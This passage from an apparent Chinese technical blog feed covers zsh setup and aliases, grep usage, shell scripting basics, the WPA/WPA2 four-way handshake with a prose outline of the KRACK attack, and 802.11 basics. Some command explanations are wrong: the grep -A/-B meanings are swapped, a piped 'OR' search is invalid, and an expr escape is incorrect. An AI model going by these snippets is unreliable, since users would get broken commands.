href="https://github.com/wting/autojump/downloads">https://github.com/wting/autojump/downloads</a></p></li><li><p>插件下载：wget <a href="https://github.com/downloads/wting/autojump/autojump_v21.1.2.tar.gz">https://github.com/downloads/wting/autojump/autojump_v21.1.2.tar.gz</a></p></li><li><p>解压：tar zxvf autojump_v21.1.2.tar.gz</p></li><li><p>进入解压后目录并安装：cd autojump_v21.1.2&#x2F; ; .&#x2F;install.sh</p></li><li><p>再执行下这个：source &#x2F;etc&#x2F;profile.d&#x2F;autojump.sh</p></li><li><p>编辑配置文件，添加上 autojump 的名字：vim &#x2F;root&#x2F;.zshrc</p></li></ul><ol start="2"><li>zsh-syntax-highlighting</li></ol><ul><li>这个插件会对终端命令高亮显示,比如正确的拼写会是绿色标识,否则是红色,另外对于一些shell输出语句也会有高亮显示,算是不错的辅助插件</li><li>插件官网：<a href="https://github.com/zsh-users/zsh-syntax-highlighting">https://github.com/zsh-users/zsh-syntax-highlighting</a></li><li>安装，复制该命令：git clone <a href="https://github.com/zsh-users/zsh-syntax-highlighting.git">https://github.com/zsh-users/zsh-syntax-highlighting.git</a> ${ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom}&#x2F;plugins&#x2F;zsh-syntax-highlighting</li><li>编辑：vim ~&#x2F;.zshrc，找到这一行，后括号里面的后面添加：plugins&#x3D;( 前面的一些插件名称 zsh-syntax-highlighting)</li><li>刷新下配置：source ~&#x2F;.zshrc</li></ul><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>编辑配置文件：vim &#x2F;root&#x2F;.zshrc</p><p>找到ZSH_THEME&#x3D;”ys”,个人觉得这个主题挺好看。<br>设置完记得刷新配置。</p><p>###人性化设计###</p><ul><li>tab有惊喜</li><li>使用 ctrl-r 来搜索命令历史记录。按完此快捷键后，可以输入关键命令词语，如果历史记录有含有此词语会显示出来。</li><li>命令别名：<br>在命令行中输入 alias 可以查看已经有的命令别名<br>自己新增一些别名，编辑文件：vim ~&#x2F;.zshrc，在文件加入下面格式的命令，比如以下是网友提供的一些思路：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">alias <span class="hljs-attribute">cls</span>=<span class="hljs-string">&#x27;clear&#x27;</span><br>alias <span class="hljs-attribute">ll</span>=<span class="hljs-string">&#x27;ls -l&#x27;</span><br>alias <span class="hljs-attribute">la</span>=<span class="hljs-string">&#x27;ls -a&#x27;</span><br>alias <span class="hljs-attribute">grep</span>=<span class="hljs-string">&quot;grep --color=auto&quot;</span><br>alias -s <span class="hljs-attribute">html</span>=<span class="hljs-string">&#x27;vim&#x27;</span>   # 在命令行直接输入后缀为 html 的文件名，会在 Vim 中打开<br>alias -s <span class="hljs-attribute">rb</span>=<span class="hljs-string">&#x27;vim&#x27;</span>     # 在命令行直接输入 ruby 文件，会在 Vim 中打开<br>alias -s <span class="hljs-attribute">py</span>=<span class="hljs-string">&#x27;vim&#x27;</span>      # 在命令行直接输入 python 文件，会用 vim 中打开，以下类似<br>alias -s <span class="hljs-attribute">js</span>=<span class="hljs-string">&#x27;vim&#x27;</span><br>alias -s <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;vim&#x27;</span><br>alias -s <span class="hljs-attribute">java</span>=<span class="hljs-string">&#x27;vim&#x27;</span><br>alias -s <span class="hljs-attribute">txt</span>=<span class="hljs-string">&#x27;vim&#x27;</span><br>alias -s <span class="hljs-attribute">gz</span>=<span class="hljs-string">&#x27;tar -xzvf&#x27;</span> # 在命令行直接输入后缀为 gz 的文件名，会自动解压打开<br>alias -s <span class="hljs-attribute">tgz</span>=<span class="hljs-string">&#x27;tar -xzvf&#x27;</span><br>alias -s <span class="hljs-attribute">zip</span>=<span class="hljs-string">&#x27;unzip&#x27;</span><br>alias -s <span class="hljs-attribute">bz2</span>=<span class="hljs-string">&#x27;tar -xjvf&#x27;</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="grep的使用"><a href="#grep的使用" class="headerlink" title="grep的使用"></a>grep的使用</h1><h2 id="grep常用参数说明"><a href="#grep常用参数说明" class="headerlink" title="grep常用参数说明"></a>grep常用参数说明</h2><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ldif">grep [OPTIONS] PATTERN [FILE...]<br>grep [OPTIONS] [-e PATTERN]...  [-f FILE]...  [FILE...]<br><br><span class="hljs-attribute">OPTIONS</span>:<br><span class="hljs-literal">-</span>e: 使用正则搜索<br><span class="hljs-literal">-</span>i: 不区分大小写<br><span class="hljs-literal">-</span>v: 查找不包含指定内容的行<br><span class="hljs-literal">-</span>w: 按单词搜索<br><span class="hljs-literal">-</span>c: 统计匹配到的次数<br><span class="hljs-literal">-</span>n: 显示行号<br><span class="hljs-literal">-</span>r: 逐层遍历目录查找<br><span class="hljs-literal">-</span>A: 显示匹配行及前面多少行, 如: -A3, 则表示显示匹配行及前3行<br><span class="hljs-literal">-</span>B: 显示匹配行及后面多少行, 如: -B3, 则表示显示匹配行及后3行<br><span class="hljs-literal">-</span>C: 显示匹配行前后多少行,   如: -C3, 则表示显示批量行前后3行<br><span class="hljs-literal">-</span>-color: 匹配到的内容高亮显示<br><span class="hljs-literal">-</span>-include: 指定匹配的文件类型<br><span class="hljs-literal">-</span>-exclude: 过滤不需要匹配的文件类型<br></code></pre></td></tr></table></figure><h2 id="grep常用用法"><a href="#grep常用用法" class="headerlink" title="grep常用用法"></a>grep常用用法</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#多文件查询</span><br>grep leo logs.<span class="hljs-built_in">log</span> logs_back.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找即包含leo又包含li的行</span><br>grep leo logs.<span class="hljs-built_in">log</span> <span class="hljs-string">| grep li</span><br><br><span class="hljs-meta">#查找匹配leo或者匹配li的行</span><br>grep leo <span class="hljs-string">| li logs.log</span><br><br><span class="hljs-meta">#显示匹配行前2行</span><br>grep leo logs.<span class="hljs-built_in">log</span> -A2<br><br><span class="hljs-meta">#显示匹配行后2行</span><br>grep leo logs.<span class="hljs-built_in">log</span> -B2<br><br><span class="hljs-meta">#显示匹配行前后2行</span><br>grep leo logs.<span class="hljs-built_in">log</span> -C2<br><br><span class="hljs-meta">#不区分大小写</span><br>grep -i leo logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#使用正则表达式</span><br>grep -e &#x27;[a-z]\&#123;5\&#125;&#x27; logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找不包含leo的行</span><br>grep -v leo logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#统计包含leo的行数</span><br>grep -c leo logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#遍历当前目录及所有子目录查找匹配leo的行</span><br>grep -r leo .<br><br><span class="hljs-meta">#在当前目录及所有子目录查找所有java文件中查找leo</span><br>grep -r leo . --include <span class="hljs-string">&quot;*.java&quot;</span><br><br><span class="hljs-meta">#查找并输出到指定文件</span><br>grep leo logs.<span class="hljs-built_in">log</span> &gt; result.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找以leo开头的行</span><br>grep ^leo logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找以leo结尾的行</span><br>grep leo$ logs.<span class="hljs-built_in">log</span><br><br><span class="hljs-meta">#查找空行</span><br>grep ^$ logs.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>实用工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下shell脚本的编写</title>
    <link href="/blog/2018/12/10/Linux%E4%B8%8Bshell%E8%84%9A%E6%9C%AC%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <url>/blog/2018/12/10/Linux%E4%B8%8Bshell%E8%84%9A%E6%9C%AC%E7%9A%84%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p><strong>由于需要频繁使用相同的命令，今天学习一下如何再Linux下编写简单的shell脚本，简化操作，节省时间</strong></p><p><img src="/images/fj16.jpg"></p><span id="more"></span><h2 id="规范格式"><a href="#规范格式" class="headerlink" title="规范格式"></a>规范格式</h2><p>我们关注的重点是Bash，也就是Bourne Again Shell，由于易用和免费，Bash在日常工作中被广泛使用；同时，Bash也是大多数Linux系统默认的Shell。在一般情况下，人们并不区分 Bourne Shell和Bourne Again Shell，所以，在下面的文字中，我们可以看到#!&#x2F;bin&#x2F;sh，它同样也可以改为#!&#x2F;bin&#x2F;bash。<br>利用vi等文本编辑器编写Shell脚本的格式是固定的，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment">#comments</span><br>Your commands go here<br></code></pre></td></tr></table></figure><p>首行中的符号#!告诉系统其后路径所指定的程序即是解释此脚本文件的Shell程 序。如果首行没有这句话，在执行脚本文件的时候，将会出现错误。后续的部分就是主程序，Shell脚本像高级语言一样，也有变量赋值，也有控制语句。除第 一行外，以#开头的行就是注释行，直到此行的结束。如果一行未完成，可以在行尾加上”，这个符号表明下一行与此行会合并为同一行。<br>编辑完毕，将脚本存盘为filename.sh，文件名后缀sh表明这是一个Bash脚本文件。执行脚本的时候，要先将脚本文件的属性改为可执行的：<br>chmod +x filename.sh<br>执行脚本的方法是：<br>.&#x2F;filename.sh</p><h2 id="Shell的基本知识"><a href="#Shell的基本知识" class="headerlink" title="Shell的基本知识"></a>Shell的基本知识</h2><p>与其他语言不同，Shell Script中if语句的条件部分要以分号来分隔。第三行中的[]表示条件测试，常用的条件测试有下面几种：<br>[ -f “$file” ] 判断$file是否是一个文件<br>[ $a -lt 3 ] 判断$a的值是否小于3，同样-gt和-le分别表示大于或小于等于<br>[ -x “$file” ] 判断$file是否存在且有可执行权限，同样-r测试文件可读性<br>[ -n “$a” ] 判断变量$a是否有值，测试空串用-z<br>[ “$a” &#x3D; “$b” ] 判断$a和$b的取值是否相等<br>[ cond1 -a cond2 ] 判断cond1和cond2是否同时成立，-o表示cond1和cond2有一成立<br>要注意条件测试部分中的空格。在方括号的两侧都有空格，在-f、-lt、&#x3D;等符号两侧同样也有空格。如果没有这些空格，Shell解释脚本的时候就会出错。</p><p>Linux中bash shell语音保留的关键字：<br>case、elif、let、clear、else、read、continue、if、then、echo、for in、while</p><p>2.1. shell提示符及其环境<br>提示符：$<br>环境：Linux，Unix，Dos等等<br>Shell其实就是一个解释执行命令的程序，所谓shell编程其实就是用一定的语法将各种基本的命令组合起来，让shell程序去解释执行。<br>同传统的编程语言一样，shell提供了很多特性，这些特性可以使你的shell script编程更为有用，如：数据变量、参数传递、判断、流程控制、数据输入和输出，子程序及以中断处理等。<br>2.2 如何执行shell程序<br>Shell程序（***.sh）<br>? 执行这个命令时<br>(1) #.&#x2F;***.sh<br>(2) #chmod u+x <em><strong>.sh<br>#</strong></em>.sh<br>(3) #sh ***.sh<br>2.3 常量<br>? 字符串，例如“Hello World！”。<br>? 数字，例如705，23。</p><p>2.4 变量<br>shell编程中它们是没有类型的，简称弱类型编程语言，在这个变量中可以保含一个数字，一个字符串，一个单词等。你并不需要声明这个变量，它会在引用这个变量时创建它。<br>STR&#x3D;”Hello World!”<br>echo $STR<br>　　HOME&#x3D;”&#x2F;home”                &#x2F;&#x2F;注意赋值不要有空格<br>　　a&#x3D;123<br>　　HOME_LIST&#x3D;$(ls &#x2F;home) &#x2F;&#x2F;把命令的执行结果赋值给变量<br>　　ehco $HOME                   &#x2F;&#x2F;$ 符号是获得变量HOME的值<br>　　a&#x3D;a+1<br>系统变量：<br>　　$0 这个程序的执行名字<br>　　$n 　这个程序的第n个参数值，n&#x3D;1…9<br>　　$*　 这个程序的所有参数<br>　　$# 这个程序的参数个数<br>　　$$ 这个程序的PID<br>　　$! 执行上一个背景指令的PID<br>   $? 上一个指令的返回值<br>2.5 局部变量<br> 局部变量一般是指写在函数中的变量，他的生命力是有限的。局部变量比较好理解，这里就不再多介绍了。<br>2.6 从键盘输入变量值<br>使用read命令<br>read var1 var2 … varn<br>2.7 注释<br>?Shell编程中的注释以#开头<br>2.8 数字运算<br>主要是指整数运算。expr命令可以将字符型变量转换为整数进行操作<br>语法：expr integer operator integer<br>其中operator为+ - * &#x2F; %, 但对<em>的使用要用转义符&#x2F;,如：<br>[oracle@localhost ~]$ more dvd.sh<br>#!&#x2F;bin&#x2F;bash<br>expr 5 &#x2F;</em> 5<br>[oracle@localhost ~]$ sh dvd.sh<br>25<br>2.9 逻辑运算<br>test进行逻辑运算，用[ ]括起来就是test运算<br>int1 -eq int2 相等?<br>int1 -ne int2 不等?<br>int1 -gt int2 int1 &gt; int2 ?<br>int1 -ge int2 int1 &gt;&#x3D; int2 ?<br>int1 -lt int2 int1 &lt; int2 ?<br>int1 -le int2 int1 &lt;&#x3D; int2<br>2.10 双引号及单引号<br>?$echo “$HOME $PATH”  – 显示变量值<br>&#x2F;home&#x2F;hbwork opt&#x2F;kde&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;bin:<br> $echo ‘$HOME $PATH’  – 显示单引号里的内容<br>$HOME $PATH<br>2.11 空格<br>由于shell对命令中的多余的空格不作任何处理 ，而用引号括起来则可以防止shell去掉这些空格。<br>$ str1&#x3D;abcd<br>$ str2&#x3D;”abcd “<br>2.12 分支结构<br>if [ variable &#x3D; value ]<br>then<br>command<br>else<br>if [ variable &#x3D; value ]<br>then<br>command<br>else<br>command<br>fi<br>2.13 Case语句<br>case value in<br>pattern1)<br>command;;<br>pattern2)<br>command;;<br>…<br>patternn)<br>command;<br>esac<br>2.15 循环语句<br>For循环：<br>for var in arg1 arg2 … argn<br>do<br>command<br>….<br>command<br>done</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-subst">$(id -u)</span>&quot;</span> != <span class="hljs-string">&quot;0&quot;</span> ]; <span class="hljs-keyword">then</span><br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This script must be run as root&quot;</span> 1&gt;&amp;2<br>   <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br>tar -Jcvf /home/xin/Desktop/hostapd-2018-05-21-62566bc2.tar.xz /home/xin/Desktop/hostapd-2018-05-21-62566bc2<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;compile Success!&quot;</span><br><br><span class="hljs-built_in">mv</span> -i /home/xin/Desktop/hostapd-2018-05-21-62566bc2.tar.xz /home/xin/openwrt/dl<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;move Success!&quot;</span><br><br>make FORCE\_UNSAFE\_CONFIGURE=1 V=s<br></code></pre></td></tr></table></figure><p>自己写的一个很简单的shell脚本。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WPA/WPA2 4-way handshake</title>
    <link href="/blog/2018/11/18/WPA-WPA2-4-way-handshake/"/>
    <url>/blog/2018/11/18/WPA-WPA2-4-way-handshake/</url>
    
    <content type="html"><![CDATA[<p><strong>今天了解一下WPA&#x2F;WPA2四部握手的过程，了解其中的信息交互过程，为项目代码修改做准备。</strong></p><p><img src="/images/fj15.jpg"></p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>IEEE 802.11i通过提供具有两种新协议的强健安全网络（RSN）来增强IEEE 802.11-1999：四次握手和组密钥握手。它们利用IEEE 802.1X中描述的认证服务和端口访问控制来建立和更改适当的加密密钥。RSN是一种安全网络，只允许创建健壮的安全网络关联（RSNA），这是一对站点（STA）使用的关联类型，如果建立身份验证或关联的过程它们包括4-Way Handshake。</p><p>该标准还提供了两种RSNA数据机密性和完整性协议，TKIP和CCMP，因为TKIP的机密性和完整性机制不像CCMP那样强大，因此CCMP的实施是强制性的。实施TKIP的主要目的是该算法应该在大多数仅支持WEP的旧设备的能力范围内实现。</p><p>初始认证过程使用预共享密钥（PSK）或通过802.1X 进行EAP交换（称为EAPOL，需要存在认证服务器）来执行。此过程确保客户端站（STA）通过接入点（AP）进行身份验证。在PSK或802.1X认证之后，生成共享密钥，称为成对主密钥（PMK）。PMK源自通过PBKDF2 -SHA1作为加密散列函数的密码。在预共享密钥网络中，PMK实际上是PSK。如果执行了802.1X EAP交换，则PMK从认证服务器提供的EAP参数派生。</p><h2 id="四次握手"><a href="#四次握手" class="headerlink" title="四次握手"></a>四次握手</h2><p><img src="/images/4-way-handshake.svg.png"></p><p>四次握手的设计使得接入点（或认证者）和无线客户端（或请求者）可以彼此独立地证明他们知道PSK &#x2F; PMK，而不会泄露密钥。接入点（AP）和客户端不会泄露密钥，而是相互加密消息 - 只能通过使用已经共享的PMK进行解密 - 如果消息的解密成功，则证明了PMK的知识。四次握手对于保护PMK免受恶意接入点的影响至关重要 - 例如，攻击者的SSID冒充真实接入点 - 这样客户端就不必告知接入点其PMK。</p><p>PMK旨在持续整个会话，应尽可能少地暴露; 因此，需要导出加密流量的密钥。四次握手用于建立另一个称为成对瞬态密钥（PTK）的密钥。通过连接以下属性生成PTK ：PMK，AP nonce（ANonce），STA nonce（SNonce），AP MAC地址和STA MAC地址。然后将产品通过伪随机函数。握手还产生GTK（组临时密钥），用于解密多播和广播流量。</p><p>在握手期间交换的实际消息在图中描述并在下面解释（所有消息都作为EAPOL -Key帧发送）：</p><ol><li>所述AP用钥匙重放计数器，其是用于匹配每对发送的消息，并丢弃重播消息的号码一起发送一个随机数-值（的ANonce）到STA。STA现在具有构建PTK的所有属性。</li><li>STA将其自己的随机值（SNonce）与消息完整性代码（MIC）一起发送到AP ，包括认证，其实际上是消息认证和完整性代码（MAIC），以及密钥重放计数器将是相同的作为消息1，允许AP匹配正确的消息1。</li><li>AP通过检查MIC，RSN，ANonce和密钥重放计数器字段来验证消息2，如果有效，则构建并用另一个MIC发送GTK。</li><li>STA通过检查MIC和密钥重放计数器字段来验证消息3，并且如果有效则向AP发送确认。</li></ol><p><img src="/images/wpa.png"></p><p>详见：<a href="https://mrncciew.com/2014/08/19/cwsp-4-way-handshake/" title="WPA四步握手过程">https://mrncciew.com/2014/08/19/cwsp-4-way-handshake/</a><br><strong>4次握手完成以后，之后的帧传播就都会以加密的方式进行。</strong></p><p>成对瞬态密钥（64字节）分为五个单独的密钥：</p><ol><li>16字节的EAPOL-Key确认密钥（KCK） - 用于计算WPA EAPOL密钥消息的MIC</li><li>16字节的EAPOL密钥加密密钥（KEK） - AP使用此密钥加密发送到客户端的附加数据（在“密钥数据”字段中）（例如，RSN IE或GTK）</li><li>16字节的临时密钥（TK） - 用于加密&#x2F;解密单播数据包</li><li>8个字节的Michael MIC Authenticator Tx Key - 用于计算AP发送的单播数据包的MIC</li><li>8个字节的Michael MIC Authenticator Rx Key - 用于计算由站发送的单播数据包的MIC</li></ol><p>Group Temporal Key（32字节）分为三个独立的键：</p><ol><li>16字节的组时间加密密钥 - 用于加密&#x2F;解密多播和广播数据包</li><li>8个字节的Michael MIC Authenticator Tx Key - 用于计算AP发送的组播和广播数据包的MIC</li><li>8个字节的Michael MIC Authenticator Rx Key - 当前未使用的站点不发送多播流量</li></ol><p>仅当网络使用TKIP加密数据时，才使用PTK和GTK中的Michael MIC Authenticator Tx &#x2F; Rx密钥。</p><p>已证明四步握手易受<strong>KRACK（密钥重装攻击）</strong>攻击。</p><p><img src="/images/4-way-handshake.png"></p><p>如图所示，KRACK攻击主要发生在认证和密钥建立阶段的四步握手过程中，通过简单的报文模拟诱使安全协议交互的一方重发密钥交互协议中的一条消息，另一方收到重发的这条消息后再次安装已安装过的密钥，安装时将IV等相关的信息重置后使用，从而导致了同一个密钥使用了相同的IV再次加密数据，最终造成数据被重放、解密甚至伪造等安全危害。该攻击不仅针对WPA2，对于WPA也同样适用，不论是采用预共享密钥机制还是采用IEEE 802.1x机制的Wi-Fi网络都受到该漏洞的影响。<br>详见：<a href="https://blog.csdn.net/yuaninbj/article/details/78794159" title="KRACK深度剖析">https://blog.csdn.net/yuaninbj/article/details/78794159</a></p><h2 id="组密钥握手"><a href="#组密钥握手" class="headerlink" title="组密钥握手"></a>组密钥握手</h2><p>由于预设定时器到期，可能需要更新网络中使用的组临时密钥（GTK）。当设备离开网络时，GTK也需要更新。这是为了防止设备从AP接收更多的多播或广播消息。</p><p>为了处理更新，802.11i定义了一个由双向握手组成的组密钥握手：</p><ol><li>AP将新GTK发送给网络中的每个STA。GTK使用分配给该STA的KEK加密，并通过使用MIC保护数据不被篡改。</li><li>STA确认新的GTK并回复AP。</li></ol><h2 id="CCMP概述"><a href="#CCMP概述" class="headerlink" title="CCMP概述"></a>CCMP概述</h2><p>CCMP基于AES加密算法的CCM。CCM结合了CTR的机密性和CBC-MAC的身份验证和完整性。CCM保护MPDU数据字段和IEEE 802.11 MPDU报头的选定部分的完整性。</p><h2 id="密钥层次结构"><a href="#密钥层次结构" class="headerlink" title="密钥层次结构"></a>密钥层次结构</h2><p>RSNA定义了两个关键层次结构：</p><ol><li>成对密钥层次结构，用于保护单播流量</li><li>GTK，一种由单个密钥组成的层次结构，用于保护多播和广播流量</li></ol><p>密钥层次结构的描述使用以下两个函数：</p><ul><li>L（Str，F，L） - 从左边开始，从提取位F到F + L-1。</li><li>RF-n - 产生n位输出的伪随机函数，有128,192,256,384和512版本，每个都输出这些位数。</li></ul><p>成对密钥层次结构利用PRF-384或PRF-512从PMK导出会话特定密钥，生成PTK，该PTK被分区为KCK和KEK以及MAC使用的所有临时密钥以保护单播通信。</p><p>GTK应该是一个随机数，它也是通过使用PRF-n生成的，通常是PRF-128或PRF-256，在这个模型中，组密钥层次结构采用GMK（组主密钥）并生成GTK。</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>协议</tag>
      
      <tag>802.11</tag>
      
      <tag>WPA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>802.11协议、WiFi连接交互过程</title>
    <link href="/blog/2018/11/11/802-11%E5%8D%8F%E8%AE%AE%E3%80%81WiFi%E8%BF%9E%E6%8E%A5%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/"/>
    <url>/blog/2018/11/11/802-11%E5%8D%8F%E8%AE%AE%E3%80%81WiFi%E8%BF%9E%E6%8E%A5%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>本周主要任务是更深入的了解WiFi连接过程中AP与STA之间的交互过程，深入理解802.11标准，为以后协议的修改做准备。</strong></p><p><img src="/images/fj14.jpg"></p><span id="more"></span><h1 id="802-11基本介绍"><a href="#802-11基本介绍" class="headerlink" title="802.11基本介绍"></a>802.11基本介绍</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>802.11为IEEE（美国电气和电子工程师协会，The Institute of Electrical and Electronics Engineers）于1997年公告的无线区域网路标准，适用于有线站台与无线用户或无线用户之间的沟通连结。</p><h2 id="规格一览"><a href="#规格一览" class="headerlink" title="规格一览"></a>规格一览</h2><ul><li>IEEE 802.11 ，1997年，原始标准（2Mbit&#x2F;s，工作在2.4GHz）。</li><li>IEEE 802.11a，1999年，物理层补充（54Mbit&#x2F;s，工作在5GHz）。</li><li>IEEE 802.11b，1999年，物理层补充（11Mbit&#x2F;s工作在2.4GHz）。</li><li>IEEE 802.11c，符合802.1D的媒体接入控制层桥接（MAC Layer Bridging）。</li><li>IEEE 802.11d，根据各国无线电规定做的调整。</li><li>IEEE 802.11e，对服务等级（Quality of Service, QoS）的支持。</li><li>IEEE 802.11f，基站的互连性（IAPP, Inter-Access Point Protocol），2006年2月被IEEE批准撤销。</li><li>IEEE 802.11g，2003年，物理层补充（54Mbit&#x2F;s，工作在2.4GHz）。</li><li>IEEE 802.11h，2004年，无线覆盖半径的调整，室内（indoor）和室外（outdoor）信道（5GHz频段）。</li><li>IEEE 802.11i，2004年，无线网络的安全方面的补充。</li><li>IEEE 802.11j，2004年，根据日本规定做的升级。</li><li>IEEE 802.11l，预留及准备不使用。</li><li>IEEE 802.11m，维护标准；互斥及极限。</li><li>IEEE 802.11n，更高传输速率的改善，支持多输入多输出技术（Multi-Input Multi-Output，MIMO）。 提供标准速度300M，最高速度600M的连接速度</li><li>IEEE 802.11k，该协议规范规定了无线局域网络频谱测量规范。该规范的制订体现了无线局域网络对频谱资源智能化使用的需求。</li></ul><h2 id="802-11协议的发展过程中安全、加密相关的技术"><a href="#802-11协议的发展过程中安全、加密相关的技术" class="headerlink" title="802.11协议的发展过程中安全、加密相关的技术"></a>802.11协议的发展过程中安全、加密相关的技术</h2><ol><li>WEP，Wired Equivalent Privacy: 802.11中最早期的加密标准</li><li>WPA(Wi-Fi Protected Access)</li><li>WPA2(Wi-Fi Protected Access 2)</li></ol><h2 id="802-11数据包种类"><a href="#802-11数据包种类" class="headerlink" title="802.11数据包种类"></a>802.11数据包种类</h2><ol><li>数据: 数据数据包的作用是用来携带更高层次的数据(如IP数据包，ISO7层协议)。<br>它负责在工作站之间传输数据</li><li>管理: 管理数据包控制网络的管理功能<ul><li>信标帧(Beacons): 在无线设备中，定时依次按指定间隔发送的有规律的无线信号(类似心跳包)，主要用于定位和同步使用</li><li>解除认证(Deauthentication)数据包 </li><li>Probe(request and response)</li><li>Authenticate(request and response)</li><li>Associate(request and response)</li><li>Reassociate(request and response)</li><li>Dissassociate(notify)<br>管理帧负责监督，主要用来加入或退出无线网络，以及处理接入点之间连接的转移事宜</li></ul></li><li>控制: 控制数据包得名于术语”媒体接入控制(Media Access Control, MAC)”，是用来控制对共享媒体(即物理媒介，如光缆)的访问<ul><li>请求发送(Request To Send，RTS)数据包</li><li>清除发送(Clear To Send，CTS)数据包</li><li>ACK确认(RTS&#x2F;CTS)  </li><li>PS-Poll: 当一部移动工作站从省电模式中苏醒，便会发送一个 PS-Poll 帧给基站，以取得任何暂存帧<br>控制帧通常与数据帧搭配使用，负责区域的清空、信道的取得以及载波监听的维护，并于收到数据时予以正面的应答，借此促进工作站间数据传输的可靠性</li></ul></li></ol><h2 id="802-11基本元素"><a href="#802-11基本元素" class="headerlink" title="802.11基本元素"></a>802.11基本元素</h2><ul><li><p>基本服务集（Basic Service Set，简称BSS）是802.11网络的基本组件，由一组相互通信的工作站所构成。工作站之间的通信在某个模糊地带进行着，称为基本服务区域 （Basic service area），此区域受限于所使用的无线媒介的传播特性。只要位于基本 服务区域，工作站就可以跟同一个BSS的其他成员通信。<br><img src="/images/bss.jpg"></p></li><li><p>BSA：BSS的覆盖范围称为基本服务区。 </p></li><li><p>ESS（Extended Service Set）是采用相同的SSID的多个BSS形成的更大规模的虚拟 BSS。</p></li></ul><p><img src="/images/ess.jpg"></p><ul><li>SSID是Service Set Identifier的缩写，意思是：服务集标识。SSID技术可以将一个无线 局域网分为几个需要不同身份验证的子网络，每一个子网络都需要独立的身份验证，只 有通过身份验证的用户才可以进入相应的子网络，防止未被授权的用户进入本网络。 </li><li>BSSID实际上就是AP的MAC地址，用来标识AP管理的BSS，在同一个AP内BSSID和 SSID一一映射。在一个ESS内SSID是相同的，但对于ESS内的每个AP与之对应的 BSSID是不相同的。如果一个AP可以同时支持多个SSID的话，则AP会分配不同的 BSSID来对应这些SSID。</li></ul><h2 